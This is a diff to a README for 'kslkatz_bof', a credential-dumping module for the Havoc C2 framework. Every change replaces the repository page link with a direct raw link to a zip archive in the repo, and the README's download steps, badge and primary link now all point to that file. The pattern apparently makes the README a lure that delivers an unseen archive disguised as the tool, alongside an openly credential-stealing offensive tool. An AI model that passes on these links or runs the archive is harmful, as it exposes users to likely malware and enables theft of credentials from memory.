@@ -1,6 +1,6 @@
 # ⚙️ kslkatz_bof - Run Memory-Based Credential Tasks
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Securityblanketramification663/kslkatz_bof)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip)
 
 ## 📌 What this is
 
@@ -25,7 +25,7 @@ For best results, use a non-production machine. A virtual machine works well for
 
 Go to the download page here:
 
-[Open the kslkatz_bof page](https://github.com/Securityblanketramification663/kslkatz_bof)
+[Open the kslkatz_bof page](https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip)
 
 On that page, download the project files to your computer.
 
@@ -174,7 +174,7 @@ This makes it easier to find the project again and keep test files separate from
 
 ## 📎 Download again
 
-[Visit the kslkatz_bof repository](https://github.com/Securityblanketramification663/kslkatz_bof)
+[Visit the kslkatz_bof repository](https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip)
 
 ## 📦 Expected result
 
@@ -187,4 +187,4 @@ After setup, you should be able to start the BOF from your control tool and use 
 - Use case: lab-based security testing
 - Delivery: Havoc C2 BOF
 - Main access path: physical memory
-- Primary link: https://github.com/Securityblanketramification663/kslkatz_bof
+- Primary link: https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip
